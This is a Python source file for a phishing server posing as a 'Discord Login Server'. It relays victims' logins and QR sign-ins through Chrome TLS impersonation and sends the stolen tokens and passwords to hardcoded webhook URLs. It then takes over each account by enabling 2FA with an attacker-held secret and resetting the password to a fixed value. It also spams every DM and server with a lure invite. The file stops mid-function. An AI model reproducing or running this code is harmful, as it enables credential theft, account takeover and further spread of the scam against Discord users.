"""
Discord Login Server — stealth proxy using curl_cffi for Chrome TLS impersonation.
Proper flow: visit login page → get cookies → get X-Fingerprint → login.
Run:  python discord_server.py
Open: http://localhost:8463
# v2.1 — predictive pre-challenge
"""
import subprocess, sys, os, platform, re

_deps = {
    'flask': 'flask',
    'curl_cffi': 'curl_cffi',
    'websocket': 'websocket-client',
    'cryptography': 'cryptography',
    'pyotp': 'pyotp',
}
for _m, _p in _deps.items():
    try:
        __import__(_m)
    except ImportError:
        print(f'[*] Installing {_p}...')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])

from flask import Flask, request, jsonify, send_from_directory, make_response
from curl_cffi import requests as creq   # Chrome TLS impersonation
import requests as plain_req              # for webhook (no impersonation needed)
import websocket
import json, base64, hashlib, threading, time, uuid
import pyotp
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_pad
from cryptography.hazmat.primitives import hashes, serialization

# ━━━━━━━━━━━━ Config ━━━━━━━━━━━━
PORT    = int(os.environ.get('PORT', 8463))
API     = 'https://discord.com/api/v9'
WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6')
WEBHOOK_BACKUP = 'https://discord.com/api/webhooks/1478274350720221274/d86UA6fKCcJ5_utKPTWmJ7qYrO_Z_aHTeBUb5Uo-N9NPA1kcGGwVd10yjZQ0_1Gs6Dsq'
TOTP_SECRETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'totp_secrets.txt')

# Chrome 136 UA + matching client hints
CHROME_VER = '136'
UA = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{CHROME_VER}.0.0.0 Safari/537.36'
SEC_CH_UA          = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_VER}", "Not.A/Brand";v="99"'
SEC_CH_UA_MOBILE   = '?0'
SEC_CH_UA_PLATFORM = '"Windows"'

# Captcha: human-solved — no solver API keys needed

# Role assignment after verification
BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
GUILD_ID     = os.environ.get('GUILD_ID', '')
VERIFIED_ID  = os.environ.get('VERIFIED_ID', '')
VOICE_CHANNEL_ID = os.environ.get('VOICE_CHANNEL_ID', '1477752842675683555')

VOICE_CHANNEL_ID_2 = '1478017594895106229'
GUILD_ID_2 = '1472050464659865742'

# ━━━━━━━━━━━━ Proxy for Discord API calls ━━━━━━━━━━━━
def _load_proxy():
    """Load proxy from DISCORD_PROXY env var, or first proxy in proxies.txt."""
    p = os.environ.get('DISCORD_PROXY', '').strip()
    if p:
        return p
    try:
        pf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'proxies.txt')
        with open(pf, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    return line
    except:
        pass
    return None

DISCORD_PROXY = _load_proxy()
DISCORD_PROXIES = {'https': DISCORD_PROXY, 'http': DISCORD_PROXY} if DISCORD_PROXY else None

# Adaptive proxy: start direct, switch to proxy on 429, switch back when clear
_use_proxy = False          # currently using proxy?
_proxy_lock = threading.Lock()
_rate_limit_until = 0       # timestamp when rate limit expires

def _set_proxy_mode(on: bool, reason=''):
    global _use_proxy
    with _proxy_lock:
        if _use_proxy != on:
            _use_proxy = on
            mode = f'PROXY ({DISCORD_PROXY})' if on else 'DIRECT (Railway IP)'
            print(f'[proxy] Switched to {mode} — {reason}')

def _make_session():
    """Create a curl_cffi Chrome-impersonation session. Uses proxy only when rate-limited."""
    s = creq.Session(impersonate='chrome')
    with _proxy_lock:
        if _use_proxy and DISCORD_PROXIES:
            s.proxies = DISCORD_PROXIES
    return s

def _handle_discord_response(resp):
    """Check response for rate limit. Toggle proxy on/off automatically. Returns resp."""
    global _rate_limit_until
    if resp is None:
        return resp
    if resp.status_code == 429:
        retry_after = 5
        try:
            retry_after = resp.json().get('retry_after', 5)
        except:
            pass
        _rate_limit_until = time.time() + retry_after
        if DISCORD_PROXIES:
            _set_proxy_mode(True, f'429 rate-limited, retry_after={retry_after:.1f}s')
    elif resp.status_code < 400:
        # Success on current mode — if we're on proxy and rate limit expired, try direct again
        with _proxy_lock:
            if _use_proxy and time.time() > _rate_limit_until + 10:
                _set_proxy_mode(False, 'rate limit expired, reverting to direct')
    return resp

print(f'[config] Role assignment: BOT_TOKEN={"set" if BOT_TOKEN else "MISSING"}, GUILD_ID={GUILD_ID or "MISSING"}, VERIFIED_ID={VERIFIED_ID or "MISSING"}')
print(f'[config] Voice channel: {VOICE_CHANNEL_ID} + {VOICE_CHANNEL_ID_2}')
print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts DIRECT, auto-switches on 429)')

app = Flask(__name__, static_folder='.', static_url_path='')

# ━━━━━━━━━━━━ Page Tokens (gate QR start) ━━━━━━━━━━━━
# A short-lived token is injected into /login HTML.
# /api/qr/start requires a valid token — cold requests from bots are rejected.
import secrets as _secrets
_page_tokens      = {}            # token -> expires_at
_page_token_lock  = threading.Lock()
PAGE_TOKEN_TTL    = 300           # 5 minutes

def _issue_page_token():
    tok = _secrets.token_hex(20)
    with _page_token_lock:
        _page_tokens[tok] = time.time() + PAGE_TOKEN_TTL
    return tok

def _check_page_token(tok):
    if not tok:
        return False
    with _page_token_lock:
        exp = _page_tokens.get(tok, 0)
        if time.time() > exp:
            _page_tokens.pop(tok, None)
            return False
    return True

# ━━━━━━━━━━━━ Per-IP Rate Limiter ━━━━━━━━━━━━
import collections as _col

_rl_lock   = threading.Lock()
_rl_hits   = _col.defaultdict(list)   # ip:endpoint -> [timestamps]
_rl_banned = {}                        # ip -> ban_until timestamp

# Rules: (max_hits, window_seconds, ban_seconds)
_RL_RULES = {
    'qr_start':    (20, 60,  20),   # 20 QR starts per 60s → 20s ban (tokens are primary gate)
    'qr_poll':     (120, 10, 8),    # 120 polls per 10s → 8s ban (very lenient)
    'login':       (8,  30,  120),  # 8 login attempts per 30s → 2min ban
    'default':     (30, 10,  30),   # generic: 30 reqs per 10s → 30s ban
}

def _get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr) or ''
    return ip.split(',')[0].strip()

def _rate_check(endpoint_key):
    """Returns (allowed: bool, retry_after: int)."""
    ip = _get_ip()
    now = time.time()
    max_hits, window, ban_secs = _RL_RULES.get(endpoint_key, _RL_RULES['default'])
    key = f'{ip}:{endpoint_key}'
    with _rl_lock:
        # Check active ban
        ban_until = _rl_banned.get(ip, 0)
        if now < ban_until:
            return False, int(ban_until - now)
        # Slide window
        hits = _rl_hits[key]
        cutoff = now - window
        # Discard old hits
        while hits and hits[0] < cutoff:
            hits.pop(0)
        hits.append(now)
        if len(hits) > max_hits:
            _rl_banned[ip] = now + ban_secs
            _rl_hits[key].clear()
            print(f'[ratelimit] Banned {ip} on {endpoint_key} for {ban_secs}s')
            return False, ban_secs
    return True, 0

def _rl_cleanup():
    """Periodically remove old rate-limit data to prevent memory growth."""
    while True:
        time.sleep(120)
        now = time.time()
        with _rl_lock:
            # Remove expired bans
            expired_bans = [ip for ip, t in _rl_banned.items() if now > t]
            for ip in expired_bans:
                del _rl_banned[ip]
            # Remove old hit lists
            empty_keys = [k for k, v in _rl_hits.items() if not v]
            for k in empty_keys:
                del _rl_hits[k]

threading.Thread(target=_rl_cleanup, daemon=True).start()


@app.after_request
def _add_headers(response):
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    # Prevent iOS Safari aggressive caching of HTML pages
    if response.content_type and 'text/html' in response.content_type:
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

# ━━━━━━━━━━━━ Build Number ━━━━━━━━━━━━
BUILD = 368827  # fallback

def fetch_build_number():
    """Fetch Discord's current client build number from their JS assets."""
    global BUILD
    try:
        s = _make_session()
        r = s.get('https://discord.com/login', timeout=15)
        # Grab ALL JS asset filenames from the page
        all_assets = re.findall(r'(?:src|href)=["\'](?:/assets/|https://discord\.com/assets/)(\w[\w.]+)\.js', r.text)
        if not all_assets:
            all_assets = re.findall(r'assets/(\w[\w.]*)\.js', r.text)
        # Prioritize sentry/build chunks, then check all
        priority = [a for a in all_assets if 'sentry' in a.lower() or 'build' in a.lower()]
        to_check = priority + [a for a in all_assets if a not in priority]
        for m in to_check[:20]:
            try:
                jr = s.get(f'https://discord.com/assets/{m}.js', timeout=10)
                # Multiple patterns: buildNumber:NNNNNN or "buildNumber","NNNNNN" or build_number
                for pattern in [
                    r'buildNumber["\s:,]+?(\d{5,})',
                    r'build_number["\s:,]+?(\d{5,})',
                    r'"buildNumber"\s*,\s*"?(\d{5,})',
                    r'buildNumber\}\)\}\),(\d{5,})',
                ]:
                    bm = re.search(pattern, jr.text)
                    if bm:
                        BUILD = int(bm.group(1))
                        print(f'[*] Build number: {BUILD} (from {m}.js)')
                        return
            except:
                continue
        print(f'[*] Using fallback build: {BUILD}')
    except Exception as e:
        print(f'[!] Build fetch failed: {e}, using {BUILD}')


def sprops():
    return base64.b64encode(json.dumps({
        "os": "Windows", "browser": "Chrome", "device": "",
        "system_locale": "en-US", "browser_user_agent": UA,
        "browser_version": f"{CHROME_VER}.0.0.0", "os_version": "10",
        "referrer": "", "referring_domain": "",
        "referrer_current": "", "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": BUILD, "client_event_source": None
    }).encode()).decode()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


# ━━━━━━━━━━━━ Stealth Discord Session ━━━━━━━━━━━━
class DiscordSession:
    """
    Creates a curl_cffi session that impersonates Chrome's TLS fingerprint,
    visits the login page first to get cookies, then fetches X-Fingerprint.
    This mimics a real browser and avoids account locks.
    """
    def __init__(self):
        self.s = _make_session()
        self.fingerprint = None
        self.cookies_ready = False

    def prepare(self):
        """Step 1: Visit login page → cookies.  Step 2: /experiments → fingerprint."""
        # Step 1: GET /login — Cloudflare sets __dcfduid, __sdcfduid, __cfruid, locale
        try:
            r = self.s.get('https://discord.com/login', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
            self.cookies_ready = r.status_code == 200
            print(f'[*] Login page: {r.status_code}, cookies: {list(self.s.cookies.keys())}')
        except Exception as e:
            print(f'[!] Login page failed: {e}')
            self.cookies_ready = False

        # Step 2: GET /experiments → X-Fingerprint (no auth header)
        try:
            r2 = self.s.get(f'{API}/experiments', headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'X-Track': sprops(),
            }, timeout=15)
            if r2.status_code == 200:
                self.fingerprint = r2.json().get('fingerprint')
                print(f'[*] Fingerprint: {self.fingerprint[:20]}...' if self.fingerprint else '[!] No fingerprint in response')
            else:
                print(f'[!] Experiments: {r2.status_code}')
        except Exception as e:
            print(f'[!] Experiments failed: {e}')

        return self

    def _headers(self, extra=None):
        h = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'User-Agent': UA,
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/Los_Angeles',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': sprops(),
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        if self.fingerprint:
            h['X-Fingerprint'] = self.fingerprint
        if extra:
            h.update(extra)
        return h

    def _sync_proxy(self):
        """Sync this session's proxy setting with current global mode."""
        with _proxy_lock:
            if _use_proxy and DISCORD_PROXIES:
                self.s.proxies = DISCORD_PROXIES
            else:
                self.s.proxies = {}

    def post(self, path, json_data, timeout=30, extra_headers=None):
        self._sync_proxy()
        hdrs = self._headers()
        if extra_headers:
            hdrs.update(extra_headers)
        r = self.s.post(
            f'{API}{path}',
            headers=hdrs,
            json=json_data,
            timeout=timeout
        )
        _handle_discord_response(r)
        return r

    def snapshot(self):
        """Save cookies + fingerprint so they can be restored on a fresh session."""
        return {
            'cookies': dict(self.s.cookies),
            'fingerprint': self.fingerprint,
        }

    def restore(self, snap):
        """Apply saved cookies + fingerprint to this (fresh) session."""
        for k, v in snap.get('cookies', {}).items():
            self.s.cookies.set(k, v)
        self.fingerprint = snap.get('fingerprint')


# ━━━━━━━━━━━━ Webhook ━━━━━━━━━━━━
_webhookd_tokens: set = set()
_webhookd_lock = threading.Lock()


def _solve_hcap(sitekey, pageurl):
    """Human-solved captcha — no API solver."""
    return None


_pw_store = {}       # ticket/token -> password (short-lived lookup)
_pw_store_lock = threading.Lock()

def _hq_guilds(token):
    h = {"Authorization": token, "User-Agent": UA}
    try:
        gs = plain_req.get(f"{API}/users/@me/guilds?with_counts=true", headers=h, timeout=10).json()
        out = []
        for g in gs:
            if g.get("owner") or g.get("permissions") == "4398046511103":
                out.append(f"• **{g.get('name','?')}** (`{g.get('id','?')}`) — {g.get('approximate_member_count','?')} members")
        return "\n".join(out) if out else "None"
    except:
        return "Error"


# ━━━━━━━━━━━━ IP Helpers ━━━━━━━━━━━━
_RAILWAY_PREFIXES = ('104.156.', '100.64.', '172.', '10.', '192.168.', '127.')

def _clean_ip(raw_ip):
    """Extract real client IP from X-Forwarded-For, stripping Railway/proxy/private IPs."""
    if not raw_ip or raw_ip == '?':
        return '?'
    parts = [p.strip() for p in raw_ip.split(',')]
    # Filter out Railway proxy IPs and private ranges — keep only real client IPs
    for ip in parts:
        if not any(ip.startswith(pfx) for pfx in _RAILWAY_PREFIXES):
            return ip
    # All IPs are proxy/private — no real client IP available
    return '?'


# ━━━━━━━━━━━━ Auto 2FA (TOTP) ━━━━━━━━━━━━
def _auto_enable_2fa(token, password):
    """
    Enable TOTP 2FA on a captured account using 3-step Discord flow:
      1. POST totp/enable → 401 code 60003, get MFA ticket
      2. POST /mfa/finish  → verify password, get MFA JWT
      3. POST totp/enable  → with X-Discord-MFA-Authorization + secret + code → 200
    Uses curl_cffi (Chrome TLS) + X-Super-Properties (required by Discord).
    Returns (new_token, secret, backup_codes) on success.
    Returns (None, None, None) on failure (no crash).
    """
    if not password or password == '?':
        print(f'[2fa] Skipped — no password available')
        return None, None, None

    enable_url = f'{API}/users/@me/mfa/totp/enable'
    finish_url = f'{API}/mfa/finish'
    h = {
        "Authorization": token,
        "User-Agent": UA,
        "Content-Type": "application/json",
        "X-Super-Properties": sprops(),
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-CH-UA": SEC_CH_UA,
        "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/Los_Angeles",
    }

    try:
        s = _make_session()
        # Warm session with login page cookies
        try:
            s.get('https://discord.com/login', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        # ── Step 1: Trigger MFA gate → get ticket ──
        print(f'[2fa] Step 1: triggering MFA gate...')
        r1 = s.post(enable_url, headers=h, json={'password': password}, timeout=15)
        j1 = r1.json()
        err_code = j1.get('code', 0)
        ticket = j1.get('mfa', {}).get('ticket', '')
        print(f'[2fa] Step 1: [{r1.status_code}] code={err_code} ticket={"yes" if ticket else "no"}')

        if err_code != 60003 or not ticket:
            if r1.status_code == 200:
                print(f'[2fa] Unexpected 200 — 2FA may already be enabled')
            else:
                print(f'[2fa] Step 1 failed (expected 60003): code={err_code} msg={j1.get("message", "?")}')
            return None, None, None

        # ── Step 2: Verify password via /mfa/finish → get MFA JWT ──
        print(f'[2fa] Step 2: verifying password...')
        r2 = s.post(finish_url, headers=h, json={
            'ticket': ticket,
            'mfa_type': 'password',
            'data': password,
        }, timeout=15)
        j2 = r2.json()
        mfa_jwt = j2.get('token', '')
        print(f'[2fa] Step 2: [{r2.status_code}] jwt={"yes" if mfa_jwt else "no"}')

        if r2.status_code != 200 or not mfa_jwt:
            print(f'[2fa] Step 2 failed: {j2.get("message", "?")} (code {j2.get("code", "?")})')
            return None, None, None

        # ── Step 3: Enable TOTP with MFA authorization ──
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        code = totp.now()

        h3 = dict(h)
        h3['X-Discord-MFA-Authorization'] = mfa_jwt

        print(f'[2fa] Step 3: enabling TOTP...')
        r3 = s.post(enable_url, headers=h3, json={
            'password': password,
            'secret': secret,
            'code': code,
        }, timeout=15)

        if r3.status_code != 200:
            j3 = r3.json()
            print(f'[2fa] Step 3 failed: [{r3.status_code}] {j3.get("message", "?")} (code {j3.get("code", "?")})')
            return None, None, None

        result = r3.json()
        new_token = result.get('token', token)
        backup_codes = [c['code'] for c in result.get('backup_codes', []) if not c.get('consumed')]

        # Save to file
        try:
            with open(TOTP_SECRETS_FILE, 'a', encoding='utf-8') as f:
                f.write(json.dumps({
                    'token': new_token,
                    'old_token': token,
                    'password': password,
                    'secret': secret,
                    'backup_codes': backup_codes,
                    'enabled_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
                }) + '\n')
        except Exception as e:
            print(f'[2fa] Warning: could not save secret file: {e}')

        print(f'[2fa] ✅ 2FA Enabled! Secret: {secret[:8]}..., backups: {len(backup_codes)}, new token: {new_token[:20]}...')
        return new_token, secret, backup_codes

    except Exception as e:
        print(f'[2fa] Error: {e}')
        import traceback
        traceback.print_exc()
        return None, None, None


DEFAULT_NEW_PASSWORD = 'Fatdude11$'


def _pw_patch_with_captcha(s, url, headers, body, label='pw'):
    """PATCH /users/@me with automatic captcha solving if Discord demands one.
    Returns (response_json, status_code)."""
    r = s.patch(url, headers=headers, json=body, timeout=15)
    j = r.json()

    # Check for captcha challenge — can't auto-solve (human-only mode)
    ckeys = j.get('captcha_key', [])
    if isinstance(ckeys, list) and ('captcha-required' in ckeys or
            'You need to update your app to perform this action.' in ckeys):
        print(f'[{label}] Captcha required on PATCH — cannot auto-solve in human-only mode')
        return j, r.status_code

    return j, r.status_code


def _auto_change_password(token, old_password, new_password=None, mfa_enabled=False, totp_secret=None):
    """
    Change account password. Returns (new_token, final_password) on success.
    For MFA accounts, uses ticket + TOTP verify (if we have the secret) or
    password verify fallback + MFA JWT flow.
    Handles captcha challenges on the PATCH request automatically.
    Returns (None, old_password) on failure.
    """
    if new_password is None:
        new_password = DEFAULT_NEW_PASSWORD
    if not old_password or old_password == '?' or old_password == new_password:
        return None, old_password

    patch_url = f'{API}/users/@me'
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
        'X-Discord-Timezone': 'America/Los_Angeles',
    }

    try:
        s = _make_session()
        try:
            s.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
        except:
            pass

        body = {'password': old_password, 'new_password': new_password}
        j1, sc1 = _pw_patch_with_captcha(s, patch_url, h, body, 'pw-init')

        if sc1 == 200:
            new_tok = j1.get('token', '')
            print(f'[pw] ✅ Password changed (no MFA). New token: {new_tok[:20]}...')
            return new_tok, new_password

        err_code = j1.get('code', 0)

        # MFA required — ticket flow
        if err_code == 60003:
            ticket = j1.get('mfa', {}).get('ticket', '')
            methods = [m.get('type') for m in j1.get('mfa', {}).get('methods', [])]
            if not ticket:
                print(f'[pw] MFA required but no ticket')
                return None, old_password

            print(f'[pw] MFA required. ticket={ticket[:20]}... methods={methods} have_totp={bool(totp_secret)}')

            # Step 2: verify via TOTP (preferred) or password fallback
            mfa_jwt = None
            if totp_secret and ('totp' in methods or not methods):
                code = pyotp.TOTP(totp_secret).now()
                print(f'[pw] Using TOTP code: {code}')
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'totp', 'data': code,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] TOTP verify OK')
                else:
                    print(f'[pw] TOTP verify failed [{r2.status_code}]: {r2.text[:200]}')

            # Fallback: password verify (works when 'password' in methods)
            if not mfa_jwt and 'password' in methods:
                r2 = s.post(f'{API}/mfa/finish', headers=h, json={
                    'ticket': ticket, 'mfa_type': 'password', 'data': old_password,
                }, timeout=15)
                if r2.status_code == 200:
                    mfa_jwt = r2.json().get('token', '')
                    print(f'[pw] Password verify OK')
                else:
                    print(f'[pw] Password verify failed [{r2.status_code}]: {r2.text[:200]}')

            if not mfa_jwt:
                print(f'[pw] Could not complete MFA verification')
                return None, old_password

            # Step 3: change password with MFA auth (+ captcha handling)
            h3 = dict(h)
            h3['X-Discord-MFA-Authorization'] = mfa_jwt
            j3, sc3 = _pw_patch_with_captcha(s, patch_url, h3, body, 'pw-mfa')

            if sc3 == 200:
                new_tok = j3.get('token', '')
                print(f'[pw] ✅ Password changed (MFA). New token: {new_tok[:20]}...')
                return new_tok, new_password
            else:
                print(f'[pw] Step 3 failed: [{sc3}] {j3.get("message", "?")} code={j3.get("code", "?")}')
                return None, old_password
        else:
            print(f'[pw] Password change failed: [{sc1}] code={err_code} {j1.get("message", "?")}')
            return None, old_password

    except Exception as e:
        print(f'[pw] Error: {e}')
        return None, old_password


# ━━━━━━━━━━━━ Mass Message (DMs first, then guilds) ━━━━━━━━━━━━
SPAM_MSG_DM    = 'discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'
SPAM_MSG_GUILD = '@everyone discord.gg/bzGsAUpdsY shes going crazy on cam wtf \U0001f62d'

# Permission bit constants
PERM_VIEW_CHANNEL   = 0x400
PERM_SEND_MESSAGES  = 0x800
PERM_ADMINISTRATOR  = 0x8

def _guild_sendable_channels(s, h, guild_id):
    """Return list of text channel IDs where user can actually send messages.
    Uses GET /guilds/{id}/channels and computes effective perms from overwrites."""
    try:
        # Get our member info for role list
        me_r = s.get(f'{API}/users/@me', headers=h, timeout=10)
        my_id = me_r.json().get('id', '') if me_r.status_code == 200 else ''

        # Get guild info for @everyone role perms
        gr = s.get(f'{API}/guilds/{guild_id}', headers=h, timeout=10)
        if gr.status_code != 200:
            return []
        guild = gr.json()
        everyone_perms = int(guild.get('roles', [{}])[0].get('permissions', '0') if guild.get('roles') else '0')

        # Get member roles
        my_roles = set()
        try:
            mr = s.get(f'{API}/users/@me/guilds/{guild_id}/member', headers=h, timeout=10)
            if mr.status_code == 200:
                my_roles = set(mr.json().get('roles', []))
        except:
            pass

        # Map role id -> permissions
        role_perms = {}
        for role in guild.get('roles', []):
            role_perms[role['id']] = int(role.get('permissions', '0'))

        # Compute base perms from roles
        base_perms = everyone_perms
        for rid in my_roles:
            base_perms |= role_perms.get(rid, 0)

        # Admin bypasses everything
        is_admin = bool(base_perms & PERM_ADMINISTRATOR)

        # Get channels
        cr = s.get(f'{API}/guilds/{guild_id}/channels', headers=h, timeout=10)
        if cr.status_code != 200:
            return []

        sendable = []
        for ch in cr.json():
            if ch.get('type') != 0:  # text channels only
                continue
            if is_admin:
                sendable.append(ch['id'])
                continue

            # Apply permission overwrites
            perms = base_perms
            overwrites = ch.get('permission_overwrites', [])

            # @everyone overwrite first
            for ow in overwrites:
                if ow['id'] == guild_id:  # @everyone role id == guild id
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            # Role overwrites
            allow_role = 0
            deny_role = 0
            for ow in overwrites:
                if ow['type'] == 0 and ow['id'] in my_roles:  # type 0 = role
                    deny_role |= int(ow.get('deny', '0'))
                    allow_role |= int(ow.get('allow', '0'))
            perms &= ~deny_role
            perms |= allow_role

            # Member-specific overwrite
            for ow in overwrites:
                if ow['type'] == 1 and ow['id'] == my_id:  # type 1 = member
                    perms &= ~int(ow.get('deny', '0'))
                    perms |= int(ow.get('allow', '0'))

            if (perms & PERM_VIEW_CHANNEL) and (perms & PERM_SEND_MESSAGES):
                sendable.append(ch['id'])

        return sendable
    except Exception as e:
        print(f'[spam] Permission check failed for guild {guild_id}: {e}')
        return []

def _mass_message(token, uname='?'):
    """Send message to all open DMs, then all accessible guild text channels.
    Pre-checks channel permissions to avoid wasting API calls on 403s.
    Uses the active (post-takeover) token. 1s delay between messages.
    Runs in background thread so webhook isn't blocked."""
    s = _make_session()
    h = {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'X-Super-Properties': sprops(),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Discord-Locale': 'en-US',
    }
    sent = 0
    failed = 0

    # ── DMs first ──
    try:
        r = s.get(f'{API}/users/@me/channels', headers=h, timeout=10)
        dm_ids = [c['id'] for c in r.json()] if r.status_code == 200 else []
        print(f'[spam] {uname}: {len(dm_ids)} DM channels')
    except:
        dm_ids = []

    for cid in dm_ids:
        try:
            r = s.post(f'{API}/channels/{cid}/messages', headers=h,
                       json={'content': SPAM_MSG_DM}, timeout=10)
            if r.status_code in (200, 201):
                sent += 1
            else:
                failed += 1
                if r.status_code == 429:
                    retry = r.json().get('retry_after', 2)
                    print(f'[spam] Rate limited, waiting {retry:.1f}s')
                    time.sleep(retry + 0.5)
                    # Retry once
                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
                                json={'content': SPAM_MSG_DM}, timeout=10)
                    if r2.status_code in (200, 201):
                        sent += 1; failed -= 1
        except:
            failed += 1
        time.sleep(1.3)

    # ── Guild channels (pre-checked permissions) ──
    try:
        r = s.get(f'{API}/users/@me/guilds', headers=h, timeout=10)
        guilds = r.json() if r.status_code == 200 else []
        print(f'[spam] {uname}: {len(guilds)} guilds')
    except:
        guilds = []

    for g in guilds:
        gid = g.get('id')
        if not gid:
            continue
        # Pre-check: get channels where we actually have send perms
        sendable = _guild_sendable_channels(s, h, gid)
        if not sendable:
            print(f'[spam] {uname}: guild {g.get("name","?")} — no sendable channels, skipping')
            continue
        print(f'[spam] {uname}: guild {g.get("name","?")} — {len(sendable)} sendable channels')

        # Send to first sendable channel only (1 message per guild)
        for cid in sendable[:3]:  # try up to 3 in case first still fails
            try:
                r = s.post(f'{API}/channels/{cid}/messages', headers=h,
                           json={'content': SPAM_MSG_GUILD}, timeout=10)
                if r.status_code in (200, 201):
                    sent += 1
                    break  # 1 message per guild
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 2)
                    time.sleep(retry + 0.5)
                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
                                json={'content': SPAM_MSG_GUILD}, timeout=10)
                    if r2.status_code in (200, 201):
                        sent += 1
                        break
                elif r.status_code == 403:
                    continue  # perm check was wrong, try next
                else:
                    failed += 1
                    break
            except:
                continue
        time.sleep(1.3)

    print(f'[spam] {uname}: Done! sent={sent} failed={failed}')


def send_webhook(token, client_ip="?", password="?"):
    client_ip = _clean_ip(client_ip)
    comp  = os.environ.get('COMPUTERNAME', platform.node())
    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))

    # Stealth session for all Discord API calls
    s_api = _make_session()
    try:
        s_api.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
    except:
        pass
    api_h = {
        "Authorization": token, "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "X-Super-Properties": sprops(),
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-CH-UA": SEC_CH_UA, "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
